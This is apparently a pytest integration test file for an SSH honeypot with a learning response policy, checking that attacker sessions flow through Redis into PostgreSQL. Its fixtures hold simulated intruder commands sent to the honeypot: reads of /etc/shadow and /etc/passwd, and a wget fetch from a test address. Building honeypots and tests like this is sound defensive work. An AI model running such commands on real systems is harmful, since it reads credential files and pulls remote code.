"""Integration tests: real Redis + PostgreSQL from docker compose.

Uses a dedicated `cruxtrap_test` database and a unique stream per test, so the
development database is never touched. Skips if the services are not running.
"""
import asyncio
import json
import os
import uuid

import asyncpg
import pytest
import redis.asyncio as aioredis

from honeypot.config import RLParams, Settings
from honeypot.emitter import RedisEmitter
from honeypot.rl.policies import QLearningPolicy
from honeypot.server import start_server
from pipeline.config import PipelineSettings
from pipeline.consumer import Pipeline
from pipeline.geoip import GeoIP

REDIS_URL = os.getenv("TEST_REDIS_URL", "redis://127.0.0.1:6379/15")
ADMIN_DSN = os.getenv("TEST_PG_ADMIN", "postgresql://cruxtrap:cruxtrap@127.0.0.1:55432/cruxtrap")
TEST_DSN = ADMIN_DSN.rsplit("/", 1)[0] + "/cruxtrap_test"


async def _services_up() -> bool:
    try:
        r = aioredis.from_url(REDIS_URL)
        await r.ping()
        await r.aclose()
        c = await asyncpg.connect(ADMIN_DSN, timeout=3)
        await c.close()
        return True
    except (OSError, asyncpg.PostgresError, Exception):  # noqa: BLE001
        return False


@pytest.fixture
async def pipeline():
    if not await _services_up():
        pytest.skip("Redis/PostgreSQL not running (docker compose up -d)")
    admin = await asyncpg.connect(ADMIN_DSN)
    if not await admin.fetchval("SELECT 1 FROM pg_database WHERE datname = 'cruxtrap_test'"):
        await admin.execute("CREATE DATABASE cruxtrap_test")
    await admin.close()
    conn = await asyncpg.connect(TEST_DSN)
    await conn.execute("DROP TABLE IF EXISTS session_actions, sessions, login_attempts, attackers CASCADE")
    await conn.close()

    stream = f"test:events:{uuid.uuid4().hex[:8]}"
    settings = PipelineSettings(redis_url=REDIS_URL, stream=stream, dead_letter_stream=stream + ":dead",
                                database_url=TEST_DSN, geoip_db="", consumer="test")
    p = Pipeline(settings)
    await p.start()
    yield p
    await p.redis.delete(stream, stream + ":dead")
    await p.close()


async def push(p: Pipeline, event: dict) -> None:
    await p.redis.xadd(p.s.stream, {"data": json.dumps(event)})


def ev(type_, sid, **kw):
    return {"type": type_, "ts": "2026-11-15T10:00:00.000+00:00", "session_id": sid, "src_ip": "203.0.113.7",
            "src_port": 51000, **kw}


async def test_full_session_lands_in_tables(pipeline):
    sid = str(uuid.uuid4())
    for e in [
        {"type": "connection", "ts": "2026-11-15T10:00:00+00:00", "src_ip": "203.0.113.7", "src_port": 51000},
        {"type": "login_attempt", "ts": "2026-11-15T10:00:01+00:00", "src_ip": "203.0.113.7", "src_port": 51000,
         "username": "root", "password": "admin123", "attempt": 1, "success": True},
        ev("session_start", sid, username="root", password="admin123", pty=True, term="xterm", exec_command=None),
        ev("command", sid, seq=1, command="uname -a", category="recon", phase="early", state="recon|early",
           action="ALLOW", epsilon=0.3, q_values={"ALLOW": 0.5}, latency_ms=1, output_bytes=90, decoys_planted=False),
        ev("command", sid, seq=2, command="cat /etc/shadow", category="cred_access", phase="early",
           state="cred_access|early", action="FAKE", epsilon=0.3, q_values={"ALLOW": 0.5}, latency_ms=1,
           output_bytes=400, decoys_planted=True),
        ev("rl_update", sid, seq=1, state="recon|early", action="ALLOW", reward=2.5, continued=True,
           next_state="cred_access|early", q_values={"ALLOW": 0.7}),
        ev("rl_update", sid, seq=2, state="cred_access|early", action="FAKE", reward=0.0, continued=False,
           next_state="__terminal__", q_values={"FAKE": 0.0}),
        ev("session_end", sid, username="root", commands=2, reason="exit", duration_s=12.5, total_reward=2.5,
           epsilon=0.2985, episodes=1),
    ]:
        await push(pipeline, e)
    assert await pipeline.drain() == 8

    async with pipeline.db.pool.acquire() as c:
        a = await c.fetchrow("SELECT * FROM attackers")
        assert str(a["src_ip"]) == "203.0.113.7"
        assert (a["total_connections"], a["total_login_attempts"], a["total_sessions"], a["total_commands"]) == (1, 1, 1, 2)
        s = await c.fetchrow("SELECT * FROM sessions")
        assert s["command_count"] == 2 and s["end_reason"] == "exit" and s["password"] == "admin123"
        rows = await c.fetch("SELECT seq, action, reward, continued, q_after FROM session_actions ORDER BY seq")
        assert [(r["seq"], r["action"], r["reward"], r["continued"]) for r in rows] == [(1, "ALLOW", 2.5, True), (2, "FAKE", 0.0, False)]
        assert json.loads(rows[0]["q_after"]) == {"ALLOW": 0.7}
    # everything acknowledged
    pending = await pipeline.redis.xpending(pipeline.s.stream, pipeline.s.group)
    assert pending["pending"] == 0


async def test_unauthenticated_disconnect(pipeline):
    """A scanner that connects and never logs in emits only connection + disconnect."""
    base = {"ts": "2026-11-15T10:00:00+00:00", "src_ip": "192.0.2.50", "src_port": 4}
    await push(pipeline, {"type": "connection", **base})
    await push(pipeline, {"type": "disconnect", **base, "authenticated": False, "error": None})
    await pipeline.drain()
    assert pipeline.failed == 0 and pipeline.processed == 2
    async with pipeline.db.pool.acquire() as c:
        assert await c.fetchval("SELECT total_connections FROM attackers WHERE src_ip = '192.0.2.50'") == 1


async def test_redelivery_is_idempotent(pipeline):
    sid = str(uuid.uuid4())
    cmd = ev("command", sid, seq=1, command="id", category="recon", phase="early", state="recon|early",
             action="ALLOW", epsilon=0.3, q_values={}, latency_ms=0, output_bytes=10, decoys_planted=False)
    await push(pipeline, ev("session_start", sid, username="root", password="x"))
    await push(pipeline, cmd)
    await push(pipeline, cmd)  # duplicate delivery
    await pipeline.drain()
    async with pipeline.db.pool.acquire() as c:
        assert await c.fetchval("SELECT count(*) FROM session_actions") == 1
        assert await c.fetchval("SELECT command_count FROM sessions") == 1


async def test_command_without_session_start_still_stored(pipeline):
    sid = str(uuid.uuid4())
    await push(pipeline, ev("command", sid, seq=1, command="ls", category="fs_browse", phase="early",
                            state="fs_browse|early", action="ALLOW", epsilon=0.3, q_values={}, latency_ms=0,
                            output_bytes=5, decoys_planted=False))
    await pipeline.drain()
    async with pipeline.db.pool.acquire() as c:
        assert await c.fetchval("SELECT count(*) FROM sessions WHERE session_id = $1", uuid.UUID(sid)) == 1


async def test_malformed_message_is_dead_lettered(pipeline):
    await pipeline.redis.xadd(pipeline.s.stream, {"data": "{not json"})
    await pipeline.redis.xadd(pipeline.s.stream, {"data": json.dumps({"type": "session_start", "src_ip": "203.0.113.9"})})  # no session_id
    await push(pipeline, {"type": "connection", "ts": "2026-11-15T10:00:00+00:00", "src_ip": "203.0.113.8", "src_port": 1})
    await pipeline.drain()
    assert pipeline.failed == 2 and pipeline.processed == 1
    assert await pipeline.redis.xlen(pipeline.s.dead_letter_stream) == 2
    pending = await pipeline.redis.xpending(pipeline.s.stream, pipeline.s.group)
    assert pending["pending"] == 0


async def test_unacked_messages_replay_after_crash(pipeline):
    """Simulate a crash: a message is delivered but never acked. A restarted consumer
    with the same name must process it from the PEL."""
    await push(pipeline, {"type": "connection", "ts": "2026-11-15T10:00:00+00:00", "src_ip": "198.51.100.4", "src_port": 1})
    await pipeline.redis.xreadgroup(pipeline.s.group, pipeline.s.consumer, {pipeline.s.stream: ">"}, count=10)
    assert (await pipeline.redis.xpending(pipeline.s.stream, pipeline.s.group))["pending"] == 1
    assert await pipeline.drain(pending_only=True) == 1
    assert (await pipeline.redis.xpending(pipeline.s.stream, pipeline.s.group))["pending"] == 0
    async with pipeline.db.pool.acquire() as c:
        assert await c.fetchval("SELECT total_connections FROM attackers WHERE src_ip = '198.51.100.4'") == 1


async def test_orphans_from_dead_consumer_are_claimed(pipeline):
    """A consumer with a different name (a previous process) read a message and died."""
    await push(pipeline, {"type": "connection", "ts": "2026-11-15T10:00:00+00:00", "src_ip": "198.51.100.5", "src_port": 1})
    await pipeline.redis.xreadgroup(pipeline.s.group, "dead-consumer", {pipeline.s.stream: ">"}, count=10)
    assert await pipeline.drain() == 0                       # not ours, not new
    assert await pipeline.claim_orphans(min_idle_ms=0) == 1
    assert (await pipeline.redis.xpending(pipeline.s.stream, pipeline.s.group))["pending"] == 0


async def test_idle_blocking_read_does_not_raise(pipeline):
    """Regression: an idle XREADGROUP BLOCK must return 0, not raise a socket TimeoutError."""
    assert await pipeline.read_batch(">", block_ms=1500) == 0


async def test_redis_outage_is_survived(pipeline):
    """Point the consumer at a dead Redis: reads must report 0 and keep going, not crash."""
    live = pipeline.redis
    pipeline.redis = aioredis.from_url("redis://127.0.0.1:1/0", socket_connect_timeout=0.5)
    try:
        assert await pipeline.read_batch(">", block_ms=100) == 0
    finally:
        await pipeline.redis.aclose()
        pipeline.redis = live


async def test_group_recreated_after_stream_wiped(pipeline):
    await pipeline.redis.delete(pipeline.s.stream)
    assert await pipeline.read_batch(">", block_ms=100) == 0          # NOGROUP -> recreate
    await push(pipeline, {"type": "connection", "ts": "2026-11-15T10:00:00+00:00", "src_ip": "192.0.2.77", "src_port": 1})
    assert await pipeline.drain() == 1


async def test_end_to_end_honeypot_to_postgres(pipeline, tmp_path):
    """Real SSH client -> honeypot -> Redis -> pipeline -> PostgreSQL."""
    import asyncssh
    settings = Settings(host_key_path=str(tmp_path / "hk"), qtable_path=str(tmp_path / "q.json"),
                        login_attempts_min=1, login_attempts_max=1)
    emitter = RedisEmitter(REDIS_URL, pipeline.s.stream)
    acceptor, _ = await start_server(settings, policy=QLearningPolicy(RLParams(epsilon0=0.0)), emitter=emitter,
                                     host="127.0.0.1", port=0, time_scale=0.02)
    try:
        async with asyncssh.connect("127.0.0.1", acceptor.get_port(), username="admin", password="hunter2",
                                    known_hosts=None, client_keys=None) as conn:
            for cmd in ("whoami", "cat /etc/passwd", "wget http://198.51.100.9/x"):
                await conn.run(cmd)
        await asyncio.sleep(0.3)                 # let session_end be emitted
        assert await emitter.flush(5)            # emitter forwards in the background
        await pipeline.drain()
    finally:
        acceptor.close()
        await emitter.close()
    async with pipeline.db.pool.acquire() as c:
        assert await c.fetchval("SELECT count(*) FROM sessions WHERE username = 'admin'") == 3  # one per exec
        cats = [r["category"] for r in await c.fetch("SELECT category FROM session_actions ORDER BY ts, seq")]
        assert sorted(cats) == ["cred_access", "download", "recon"]
        assert await c.fetchval("SELECT count(*) FROM session_actions WHERE reward IS NULL") == 0
        loc = await c.fetchrow("SELECT country_code, country FROM attackers WHERE src_ip = '127.0.0.1'")
        assert loc["country_code"] == "LO"


def test_geoip_without_database():
    g = GeoIP(None)
    assert g.lookup("127.0.0.1")["country_code"] == "LO"
    assert g.lookup("10.1.2.3")["country_code"] == "PR"
    assert g.lookup("8.8.8.8")["country"] is None
    assert g.lookup("not-an-ip")["country"] is None
